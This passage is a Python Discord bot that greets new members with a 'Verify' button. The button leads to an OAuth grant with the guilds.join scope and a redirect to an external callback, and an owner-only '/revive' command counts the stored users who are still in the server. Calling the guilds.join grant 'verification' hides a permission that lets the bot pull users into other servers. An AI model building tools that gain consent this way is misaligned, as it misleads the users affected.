import discord
from discord.ext import commands
from discord import app_commands
import json
import os

GUILD_ID = 1454510378305327291
VERIFY_CHANNEL = 1454834468115452026
LOG_CHANNEL = 1454840923300298906
OWNER_ID = 413597092867735552

ROLE_IDS = [
    1454607108300603525,
    1454605263234535567
]

OAUTH_URL = (
    "https://discord.com/oauth2/authorize"
    "?client_id=1454583842110177371"
    "&response_type=code"
    "&redirect_uri=https%3A%2F%2Fverify-bot.onrender.com%2Fcallback"
    "&scope=identify+guilds.join"
)

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Logged in as {bot.user}")

@bot.event
async def on_member_join(member):
    channel = bot.get_channel(VERIFY_CHANNEL)
    if not channel:
        return

    view = discord.ui.View()
    view.add_item(
        discord.ui.Button(
            label="Verify",
            style=discord.ButtonStyle.link,
            url=OAUTH_URL
        )
    )

    await channel.send(
        f"🔒 **Verification Required**\n"
        f"Welcome {member.mention}! Please click the button below to verify.",
        view=view
    )

@bot.tree.command(name="revive", description="Check verified users status")
async def revive(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(
            "❌ You are not allowed to use this command.",
            ephemeral=True
        )
        return

    if not os.path.exists("users.json"):
        await interaction.response.send_message(
            "No verified users stored yet.",
            ephemeral=True
        )
        return

    with open("users.json", "r") as f:
        users = json.load(f)

    guild = bot.get_guild(GUILD_ID)

    still_in_server = 0
    left_server = 0

    for user_id in users:
        member = guild.get_member(int(user_id))
        if member:
            still_in_server += 1
        else:
            left_server += 1

    await interaction.response.send_message(
        f"🔄 **Revive Report**\n"
        f"✅ Still in server: **{still_in_server}**\n"
        f"❌ Left server: **{left_server}**",
        ephemeral=True
    )

def run_bot(token):

